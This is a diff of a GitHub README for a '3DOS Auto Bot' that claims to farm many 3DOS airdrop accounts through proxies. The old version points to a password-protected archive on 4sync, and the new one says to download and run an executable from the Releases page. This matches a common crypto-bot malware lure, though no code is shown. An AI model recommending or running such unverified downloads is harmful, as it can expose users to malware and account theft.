@@ -1,69 +1,85 @@
-# 3DOS Auto Bot
+# 3DOS Auto Bot 🤖
 
-An automated bot for managing multiple 3DOS accounts with proxy support.
+![3DOS Auto Bot](https://img.shields.io/badge/3DOS%20Auto%20Bot-v1.0.0-blue.svg)  
+[![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)](https://github.com/simplezzmx/3DOS-Auto-Bot/releases)
 
-# [DOWNLOAD](https://www.4sync.com/web/directDownload/0SYg-YYX/ucR3VkWM.ef25c34754ba95f31294e53aca576eca)  
+Welcome to the **3DOS Auto Bot** repository! This project offers an automated solution for managing multiple 3DOS accounts with built-in proxy support. Whether you are a developer, a crypto enthusiast, or just someone looking to simplify your 3DOS interactions, this bot can help streamline your experience.
 
-## PASSWORD - g1tsoft2025
+## Table of Contents
 
-## ✨ Features
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- Multi-account support
-- Proxy support (HTTP, SOCKS4, SOCKS5)
-- Auto-retry on failures
-- Detailed logging
-- Account earnings tracking
-- Customizable harvest intervals
+## Features ✨
 
-## 📋 Requirements
+- **Multi-Account Management**: Easily manage multiple 3DOS accounts without manual intervention.
+- **Proxy Support**: Configure proxies to ensure your activities remain private and secure.
+- **User-Friendly Interface**: Simple commands make it easy to operate the bot.
+- **Customizable Settings**: Tailor the bot's behavior to fit your needs.
+- **Regular Updates**: Continuous improvements and new features based on user feedback.
 
-- Node.js 16.x or higher
-- Valid 3DOS accounts
+## Installation 🛠️
 
-## 📝 Logs
+To get started, download the latest release from the [Releases section](https://github.com/simplezzmx/3DOS-Auto-Bot/releases). 
 
-The bot provides detailed logging:
-- Account status
-- Earnings information
-- Proxy usage
-- Error messages
-- Retry attempts
+1. Navigate to the link above.
+2. Download the executable file.
+3. Follow the installation instructions provided in the documentation.
 
-## ⚠️ Disclaimer
+## Usage 🚀
 
-This bot is for educational purposes only. Use at your own risk. Make sure to comply with 3DOS's terms of service.
+After installation, you can start using the bot. Here’s how:
 
-## 🤝 Contributing
+1. Open a terminal or command prompt.
+2. Navigate to the directory where you installed the bot.
+3. Run the bot using the command:
+   ```bash
+   ./3dos-auto-bot
+   ```
 
-1. Fork the repository
-2. Create your feature branch: `git checkout -b feature/new-feature`
-3. Commit your changes: `git commit -am 'Add new feature'`
-4. Push to the branch: `git push origin feature/new-feature`
-5. Submit a pull request
+The bot will guide you through the initial setup and configuration.
 
-## 📜 License
+## Configuration ⚙️
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+The bot comes with several configuration options to enhance your experience. Here’s how to set it up:
 
-## 💖 Support
+1. Locate the configuration file, typically named `config.json`.
+2. Open it in a text editor.
+3. Adjust the settings according to your preferences. Here are some key options:
 
-If you find this bot helpful, please consider:
-- Starring the repository
-- Following our Telegram channel
-- Contributing to the project
+   - **Accounts**: Add your 3DOS account details.
+   - **Proxies**: Configure proxy settings for enhanced security.
+   - **Notifications**: Set up alerts for important events.
 
+Make sure to save your changes before running the bot.
 
-### 🔑 Tags
-- bot 
-- airdrop 
-- 3dos 
-- 3dos-bot 
-- 3dos-ai 
-- 3dos-auto-bot 
-- 3dos-network 
-- 3dos-auto 
-- 3dos-network-bot 
-- 3dos-miner 
-- 3dos-claimer 
-- 3dos-airdrop
----
+## Contributing 🤝
+
+We welcome contributions from the community! If you want to help improve the 3DOS Auto Bot, follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Open a pull request in the original repository.
+
+Please ensure your code adheres to our coding standards and includes tests where applicable.
+
+## License 📄
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact 📫
+
+For any questions or suggestions, feel free to reach out:
+
+- **Author**: Simplezzmx
+- **Email**: simplezzmx@example.com
+- **GitHub**: [simplezzmx](https://github.com/simplezzmx)
+
+Thank you for your interest in the 3DOS Auto Bot! We hope it makes your 3DOS experience easier and more efficient. For the latest updates and releases, always check the [Releases section](https://github.com/simplezzmx/3DOS-Auto-Bot/releases).
